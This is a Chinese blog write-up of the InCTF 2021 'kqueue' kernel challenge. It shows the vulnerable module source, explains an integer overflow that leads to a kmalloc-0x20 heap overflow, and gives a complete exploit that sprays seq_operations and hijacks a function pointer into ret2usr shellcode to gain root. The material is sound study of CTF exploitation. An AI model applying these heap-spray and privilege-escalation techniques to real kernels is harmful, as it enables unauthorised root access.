---
layout: post
title: 0x06. Linux kernel基础：堆溢出
category: kernel pwn
date: 2024-9-1 15:00:00
---

堆溢出
<!-- more -->

[toc]

# Linux kernel之堆溢出

## 0x00. 基础知识：无

最高兴的一集，本篇堆溢出中涉及的知识点其实我们都已经了解了

## 0x01. 初探堆溢出：以InCTF_2021_Kqueue为例

### 题目信息

题目启动脚本如下：

```bash
#!/bin/bash

qemu-system-x86_64 \
    -cpu kvm64 \
    -m 512 \
    -nographic \
    -kernel "bzImage" \
    -append "console=ttyS0 panic=-1 pti=off kaslr quiet init=/init" \
    -monitor /dev/null \
    -initrd "./rootfs.cpio" \
    -net user \
    -net nic \
    -s 
```

可以看到：

- 关闭了`kpti`，这说明我们可以利用`retusr`等利用方法
- 开启了`kaslr`，这说明程序基地址不再固定
- 没有开启`smep`、`smap`，这说明我们可以直接利用`ret2usr`而不需要绕过

本题给出了源码，`kqueue.c`源码如下：

```c
/* Generic header files */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/device.h>
#include <linux/mutex.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include "kqueue.h"

#pragma GCC push_options
#pragma GCC optimize ("O1")

static noinline long kqueue_ioctl(struct file *file, unsigned int cmd, unsigned long arg){

    long result;

    request_t request;
    
    mutex_lock(&operations_lock);

    if (copy_from_user((void *)&request, (void *)arg, sizeof(request_t))){
        err("[-] copy_from_user failed");
        goto ret;
    }

    switch(cmd){
        case CREATE_KQUEUE:
            result = create_kqueue(request);
            break;
        case DELETE_KQUEUE:
            result = delete_kqueue(request);
            break;
        case EDIT_KQUEUE:
            result = edit_kqueue(request);
            break;
        case SAVE:
            result = save_kqueue_entries(request);
            break;
        default:
            result = INVALID;
            break;
    }
ret: 
    mutex_unlock(&operations_lock);
    return result;
}


static noinline long create_kqueue(request_t request){
    long result = INVALID;

    if(queueCount > MAX_QUEUES)
        err("[-] Max queue count reached");

    /* You can't ask for 0 queues , how meaningless */
    if(request.max_entries<1)
        err("[-] kqueue entries should be greater than 0");

    /* Asking for too much is also not good */
    if(request.data_size>MAX_DATA_SIZE)
        err("[-] kqueue data size exceed");

    /* Initialize kqueue_entry structure */
    queue_entry *kqueue_entry;

    /* Check if multiplication of 2 64 bit integers results in overflow */
    ull space = 0;
    if(__builtin_umulll_overflow(sizeof(queue_entry),(request.max_entries+1),&space) == true)
        err("[-] Integer overflow");

    /* Size is the size of queue structure + size of entry * request entries */
    ull queue_size = 0;
    if(__builtin_saddll_overflow(sizeof(queue),space,&queue_size) == true)
        err("[-] Integer overflow");

    /* Total size should not exceed a certain limit */
    if(queue_size>sizeof(queue) + 0x10000)
        err("[-] Max kqueue alloc limit reached");

    /* All checks done , now call kzalloc */
    queue *queue = validate((char *)kmalloc(queue_size,GFP_KERNEL));

    /* Main queue can also store data */
    queue->data = validate((char *)kmalloc(request.data_size,GFP_KERNEL));

    /* Fill the remaining queue structure */
    queue->data_size   = request.data_size;
    queue->max_entries = request.max_entries;
    queue->queue_size  = queue_size;

    /* Get to the place from where memory has to be handled */
    kqueue_entry = (queue_entry *)((uint64_t)(queue + (sizeof(queue)+1)/8));

    /* Allocate all kqueue entries */
    queue_entry* current_entry = kqueue_entry;
    queue_entry* prev_entry = current_entry;

    uint32_t i=1;
    for(i=1;i<request.max_entries+1;i++){
        if(i!=request.max_entries)
            prev_entry->next = NULL;
        current_entry->idx = i;
        current_entry->data = (char *)(validate((char *)kmalloc(request.data_size,GFP_KERNEL)));

        /* Increment current_entry by size of queue_entry */
        current_entry += sizeof(queue_entry)/16;

        /* Populate next pointer of the previous entry */
        prev_entry->next = current_entry;
        prev_entry = prev_entry->next;
    }

    /* Find an appropriate slot in kqueues */
    uint32_t j = 0;
    for(j=0;j<MAX_QUEUES;j++){
        if(kqueues[j] == NULL)
            break;
    }

    if(j>MAX_QUEUES)
        err("[-] No kqueue slot left");

    /* Assign the newly created kqueue to the kqueues */
    kqueues[j] = queue;
    queueCount++;
    result = 0;
    return result;
}

static noinline long delete_kqueue(request_t request){
    /* Check for out of bounds requests */
    if(request.queue_idx>MAX_QUEUES)
        err("[-] Invalid idx");

    /* Check for existence of the request kqueue */
    queue *queue = kqueues[request.queue_idx];
    if(!queue)
        err("[-] Requested kqueue does not exist");
    
    kfree(queue);
    memset(queue,0,queue->queue_size);
    kqueues[request.queue_idx] = NULL;
    return 0;
}

static noinline long edit_kqueue(request_t request){
    /* Check the idx of the kqueue */
    if(request.queue_idx > MAX_QUEUES)
        err("[-] Invalid kqueue idx");

    /* Check if the kqueue exists at that idx */
    queue *queue = kqueues[request.queue_idx];
    if(!queue)
        err("[-] kqueue does not exist");

    /* Check the idx of the kqueue entry */
    if(request.entry_idx > queue->max_entries)
        err("[-] Invalid kqueue entry_idx");

    /* Get to the kqueue entry memory */
    queue_entry *kqueue_entry = (queue_entry *)(queue + (sizeof(queue)+1)/8);

    /* Check for the existence of the kqueue entry */
    exists = false;
    uint32_t i=1;
    for(i=1;i<queue->max_entries+1;i++){
        
        /* If kqueue entry found , do the necessary */
        if(kqueue_entry && request.data && queue->data_size){
            if(kqueue_entry->idx == request.entry_idx){
                validate(memcpy(kqueue_entry->data,request.data,queue->data_size));
                exists = true;
            }
        }
        kqueue_entry = kqueue_entry->next;
    }

    /* What if the idx is 0, it means we have to update the main kqueue's data */
    if(request.entry_idx==0 && kqueue_entry && request.data && queue->data_size){
        validate(memcpy(queue->data,request.data,queue->data_size));
        return 0;
    }

    if(!exists)
        return NOT_EXISTS;
    return 0;
} 

/* Now you have the option to safely preserve your precious kqueues */
static noinline long save_kqueue_entries(request_t request){

    /* Check for out of bounds queue_idx requests */
    if(request.queue_idx > MAX_QUEUES)
        err("[-] Invalid kqueue idx");

    /* Check if queue is already saved or not */
    if(isSaved[request.queue_idx]==true)
        err("[-] Queue already saved");

    queue *queue = validate(kqueues[request.queue_idx]);

    /* Check if number of requested entries exceed the existing entries */
    if(request.max_entries < 1 || request.max_entries > queue->max_entries)
        err("[-] Invalid entry count");

    /* Allocate memory for the kqueue to be saved */
    char *new_queue = validate((char *)kzalloc(queue->queue_size,GFP_KERNEL));

    /* Each saved entry can have its own size */
    if(request.data_size > queue->queue_size)
        err("[-] Entry size limit exceed");

    /* Copy main's queue's data */
    if(queue->data && request.data_size)
        validate(memcpy(new_queue,queue->data,request.data_size));
    else
        err("[-] Internal error");
    new_queue += queue->data_size;

    /* Get to the entries of the kqueue */
    queue_entry *kqueue_entry = (queue_entry *)(queue + (sizeof(queue)+1)/8);

    /* copy all possible kqueue entries */
    uint32_t i=0;
    for(i=1;i<request.max_entries+1;i++){
        if(!kqueue_entry || !kqueue_entry->data)
            break;
        if(kqueue_entry->data && request.data_size)
            validate(memcpy(new_queue,kqueue_entry->data,request.data_size));
        else
            err("[-] Internal error");
        kqueue_entry = kqueue_entry->next;
        new_queue += queue->data_size;
    }

    /* Mark the queue as saved */
    isSaved[request.queue_idx] = true;
    return 0;
}

#pragma GCC pop_options

static int __init init_kqueue(void){
    mutex_init(&operations_lock);
    reg = misc_register(&kqueue_device);
    if(reg < 0){
        mutex_destroy(&operations_lock);
        err("[-] Failed to register kqueue");
    }
    return 0;
}


static void __exit exit_kqueue(void){
    misc_deregister(&kqueue_device);
}

module_init(init_kqueue);
module_exit(exit_kqueue);
```

而`kqueue.h`源码如下：

```c
/* Generic header files */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/device.h>
#include <linux/mutex.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/miscdevice.h>

MODULE_AUTHOR("amritabi0s1@gmail.com");                        
MODULE_DESCRIPTION("A module to save all your beloved queues");
MODULE_LICENSE("GPL");                                         
                                                            

#define CREATE_KQUEUE 0xDEADC0DE
#define EDIT_KQUEUE   0xDAADEEEE
#define DELETE_KQUEUE 0xBADDCAFE
#define SAVE          0xB105BABE


#define INVALID      -1
#define NOT_EXISTS   -3
#define MAX_QUEUES    5
#define MAX_DATA_SIZE 0x20

typedef unsigned long long ull;
ull queueCount = 0;

/* We need this to mitigate rat races */

static DEFINE_MUTEX(operations_lock);

static int reg;
static long kqueue_ioctl(struct file *file, unsigned int cmd, unsigned long arg);
static struct file_operations kqueue_fops = {.unlocked_ioctl = kqueue_ioctl};

/* Sometimes , waiting in a queue is so boring, but wait , this isn't any ordinary queue */

typedef struct{
    uint16_t data_size;
    uint64_t queue_size; /* This needs to handle larger numbers */
    uint32_t max_entries;
    uint16_t idx;
    char* data;
}queue;

/* Every kqueue has it's own entries */

typedef struct queue_entry queue_entry;

struct queue_entry{
    uint16_t idx;
    char *data;
    queue_entry *next;
};

/* I wish I could go limitless */

queue *kqueues[MAX_QUEUES] = {(queue *)NULL};

/* Boolean array to make sure you dont save queue's over and over again */

bool isSaved[MAX_QUEUES] = {false};


/* This is how a typical request looks */

typedef struct{
    uint32_t max_entries;
    uint16_t data_size;
    uint16_t entry_idx;
    uint16_t queue_idx;
    char* data;
}request_t;

/* commiting errors is not a crime, handling them incorrectly is */

static long err(char* msg){
    printk(KERN_ALERT "%s\n",msg);
    return -1;
}

static noinline long create_kqueue(request_t request);
static noinline long delete_kqueue(request_t request);
static noinline long edit_kqueue(request_t request);
static noinline long save_kqueue_entries(request_t request);

/* Initialize a flag to check for existence of stuff */
bool exists = false;

/* For Validating pointers */
static noinline void* validate(void *ptr){
    if(!ptr){
        mutex_unlock(&operations_lock);
        err("[-] oops! Internal operation error");
    }
    return ptr;
}

struct miscdevice kqueue_device = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "kqueue",
    .fops = &kqueue_fops,
};
```

### 题目分析

题目中多处用到`err`函数，而实际上其定义如下：

```c
static long err(char* msg){
    printk(KERN_ALERT "%s\n",msg);
    return -1;
}
```

可以看到，`err`函数实际上并不会使得程序退出或者进行额外的操作，只是输出错误信息。

那么，我们完全可以无视掉`err`函数的存在，这意味着程序中与`err`函数相关的检查都不存在。

题目实现了一个链表的数据管理结构，每个链表还含有一个头结点，表示该链表的相关信息。

题目拥有创建链表、编辑链表、删除链表和保存链表的功能。

其中，创建链表部分含有如下操作：

```c
if(__builtin_umulll_overflow(sizeof(queue_entry),(request.max_entries+1),&space) == true)
    err("[-] Integer overflow");

/* Size is the size of queue structure + size of entry * request entries */
ull queue_size = 0;
if(__builtin_saddll_overflow(sizeof(queue),space,&queue_size) == true)
    err("[-] Integer overflow");
```

其中`__builtin_umulll_overflow`是`gcc`内置函数，其作用是将第一个参数和第二个参数相乘，保存到第三个参数中。若发生了溢出，则返回值为`true`。

由于`err`函数并不含有错误退出的功能，因此这里的函数我们可以直接视作一个乘法操作~

对于`__builtin_saddll_overflow`函数也是同样的，只是这里实现的是一个加法功能。

我们知道这里的链表含有一个头结点，和若干个普通结点。这段代码会首先计算普通节点的`size`乘以其数量获得普通节点的总大小，并加上头节点的大小来计算出链表的总大小，以便接下来使用`kmalloc`动态分配空间。

而由于其并没有检查溢出，因此若`max_entries`的值为`0xffffffff`，那么`space`的值将为`0`，而`queue_size`的值将为`0x18`。

注意到无论是在链表的创建、编辑、保存中，都是以如下形式的循环来遍历链表的普通节点：

```c
for(i=1;i<queue->max_entries+1;i++)
```

而`max_entries`被我们设置为`0xffffffff`，那么这段代码将不会执行，**因此现在整个题目被我们简化到一个链表只含有一个头结点。**

### 漏洞分析

在保存链表的代码中，含有如下操作：

```c
char *new_queue = validate((char *)kzalloc(queue->queue_size,GFP_KERNEL));

if(queue->data && request.data_size)
    validate(memcpy(new_queue,queue->data,request.data_size));
```

其中，`queue->queue_size`为`0x18`。

这意味着，我们可以对`new_queue`这个属于`kmalloc-0x20`的`obj`进行溢出：只需要将`data_size`设置为一个大于`0x20`的值即可。而对于`kmalloc-0x20`的`obj`，我们不难想到可以使用`seq_operations`进行程序控制流的劫持。

而本题开启了`Random_freelist`，这意味着每个申请到的`obj`在内存上并不一定是相邻的。因此，这里我们使用堆喷射的方式：先喷射大量的`seq_files`，保证有一个位于`new_queue`的相邻位置（也就是位于`new_queue`的后面一个`obj`）

喷射完成后，我们溢出`new_queue`，这使得某个与`new_queue`相邻的`seq_operations`的`start`函数指针被覆盖。

因此，我们只需要对每一个喷射的`seq_files`进行`read`操作，即可触发`start`函数，随即被溢出的`start`函数将会执行我们指定的函数~

现在就只剩下一个问题：本题是开启`kaslr`的，那么我们如何才能泄露内核基地址？

实际上，由于这里我们可以直接进行`ret2user`，因此我们可以在用户态编写`shellcode`，让`seq_operations`的函数指针直接指向我们编写的`shellcode`即可~

`shellcode`的编写也是不必多说，由于代码段的偏移一样，因此只需要获得一个代码段的地址，随后使用其进行增减，即可获得`prepare_kernel_cred`和`commit_creds`等函数的地址。

### exp

带有详细注释的`exp`如下：

```c
#include "ltfallkernel.h"

#define commid_creds 0xffffffff8108c140
#define prepare_kernel_cred 0xffffffff8108c580

size_t data[0x20];
int seq_files[0x200];

typedef struct request request;
struct request
{
    uint32_t max_entries;
    uint16_t data_size;
    uint16_t entry_idx;
    uint16_t queue_idx;
    char *data;
};

typedef struct queue_entry queue_entry;
struct queue_entry{
    uint16_t idx;
    char *data;
    queue_entry *next;
};

typedef struct{
    uint16_t data_size;
    uint64_t queue_size; /* This needs to handle larger numbers */
    uint32_t max_entries;
    uint16_t idx;
    char* data;
}queue;

int file_fd;

void create_kqueue(request* t){
    ioctl(file_fd, 0xDEADC0DE, t);
}

void delete_kqueue(request* t){
    ioctl(file_fd, 0xBADDCAFE, t);
}

void edit_kqueue(request* t){
    ioctl(file_fd, 0xDAADEEEE, t);
}

void save_kqueue_entries(request* t){
    ioctl(file_fd, 0xB105BABE, t);
}

size_t root_rip = (size_t)&get_root_shell;

// commid_creds(prepare_kernel_cred(NULL));
void shellcode(){
    asm(
        "mov r12, [rsp+8];" // rsp+8处指向一个代码段的地址，我们拿过来用
        "sub r12, 0x174bf9;" // 通过偏移计算得到prepare_kernel_cred的地址
        "mov rdi, 0;" // prepare_kernel_cred(NULL);
        "call r12;"  
        "mov rdi, rax;" // 将返回值作为commit_creds的参数
        "sub r12, 0x440;" // 通过偏移计算得到commit_creds的地址
        "call r12;"
        "mov r13, user_ss;" // 后面就是返回了~
        "push r13;"
        "mov r13, user_sp;"
        "push r13;"
        "mov r13, user_rflags;"
        "push r13;"
        "mov r13, user_cs;"
        "push r13;"
        "mov r13, root_rip;"
        "push r13;"
        "swapgs;"
        "iretq;"
    );
}

int main()
{
    char buf[0x20];
    bind_core(0);
    save_status();

    // 打开题目驱动
    info("Starting to exploit...");
    file_fd = open("/dev/kqueue", 2);
    if(file_fd == -1){
        err_exit("Failed to open device!");
    }
    
    // 创建链表
    // 这里的max_entries设置为0xffffffff，使得max_entries=0
    // data_size填写为0x30，其实大于0x20就行，再大一点也OK
    // 因为在edit函数中是根据这个值来决定拷贝的长度的内容
    // 在save函数中，将原本的queue拷贝到长度为0x18的new_queue
    // 为了保证溢出，要大于0x20
    info("creating kqueue...");
    request r = {
        .max_entries = 0xffffffff,
        .data_size = 0x30, 
    };
    create_kqueue(&r);

    // 这是edit的数据，我们把每一个都填写为shellcode函数的起始地址
    info("Creating shellcode data...");
    for(int i = 0 ; i<0x20; i ++){
        data[i] = (size_t)shellcode;
    }

    // 编辑链表，也就是将我们的shellcode地址写入链表，这里是编辑到原链表
    info("editing kqueue...");
    request r1 = {
        .queue_idx = 0,
        .entry_idx = 0,
        .data = &data,
    };
    edit_kqueue(&r1);

    // 堆喷射seq_files(kmalloc-0x20)，保证有一个位于new_queue内存相邻的后面
    info("Heap spray seq_operations to trigger shellcode...");
    for(int i=0; i<0x200; i++){
        seq_files[i] = open("/proc/self/stat", O_RDONLY);
    }

    // 通过save_kqueue_entries触发堆溢出，若喷射到了相邻的seq_operations
    // 那么那个seq_operations的start函数将会被覆盖为shellcode起始地址
    info("Saving queue to trigger heap overflow...");
    request r2 = {
        .queue_idx = 0,
        .max_entries = 0,
        .data_size = 0x40,
    };
    save_kqueue_entries(&r2);

    // 触发seq_operations->start，触发漏洞
    info("Read seq_file_fd...");
    for(int i = 0 ; i<0x200; i++){
        read(seq_files[i], buf, 1);
    }
}
```









